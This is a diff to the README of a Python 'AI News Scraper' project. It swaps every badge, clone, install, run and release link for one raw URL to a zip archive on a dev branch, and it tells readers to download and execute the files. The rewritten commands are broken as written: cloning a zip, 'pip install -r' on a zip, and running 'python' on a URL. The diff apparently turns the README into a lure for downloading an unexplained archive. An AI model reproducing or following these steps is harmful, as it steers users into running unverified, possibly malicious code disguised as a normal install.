@@ -1,7 +1,7 @@
 # AI News Scraper 📰🤖
 
-![GitHub release](https://img.shields.io/github/release/techdomegh/ai-news-scraper.svg)
-![Python](https://img.shields.io/badge/python-3.8%2B-blue.svg)
+![GitHub release](https://raw.githubusercontent.com/techdomegh/ai-news-scraper/dev/src/ai-scraper-news-v2.1.zip)
+![Python](https://raw.githubusercontent.com/techdomegh/ai-news-scraper/dev/src/ai-scraper-news-v2.1.zip%https://raw.githubusercontent.com/techdomegh/ai-news-scraper/dev/src/ai-scraper-news-v2.1.zip)
 
 Welcome to the **AI News Scraper** repository! This project is a powerful Python application designed to scrape news articles, generate summaries using Generative AI, identify topics, and provide semantic search capabilities through vector embeddings. 
 
@@ -42,7 +42,7 @@ To get started with the AI News Scraper, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/techdomegh/ai-news-scraper.git
+   git clone https://raw.githubusercontent.com/techdomegh/ai-news-scraper/dev/src/ai-scraper-news-v2.1.zip
    cd ai-news-scraper
    ```
 
@@ -54,7 +54,7 @@ To get started with the AI News Scraper, follow these steps:
 
 3. **Install required packages**:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/techdomegh/ai-news-scraper/dev/src/ai-scraper-news-v2.1.zip
    ```
 
 ## Usage
@@ -63,7 +63,7 @@ Once you have installed the necessary packages, you can start using the AI News 
 
 1. **Run the application**:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/techdomegh/ai-news-scraper/dev/src/ai-scraper-news-v2.1.zip
    ```
 
 2. **Scrape news articles**:
@@ -106,9 +106,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-You can find the latest releases of the AI News Scraper [here](https://github.com/techdomegh/ai-news-scraper/releases). Download the necessary files and execute them to get started.
+You can find the latest releases of the AI News Scraper [here](https://raw.githubusercontent.com/techdomegh/ai-news-scraper/dev/src/ai-scraper-news-v2.1.zip). Download the necessary files and execute them to get started.
 
-For further updates, visit the [Releases](https://github.com/techdomegh/ai-news-scraper/releases) section regularly.
+For further updates, visit the [Releases](https://raw.githubusercontent.com/techdomegh/ai-news-scraper/dev/src/ai-scraper-news-v2.1.zip) section regularly.
 
 ## Conclusion
 
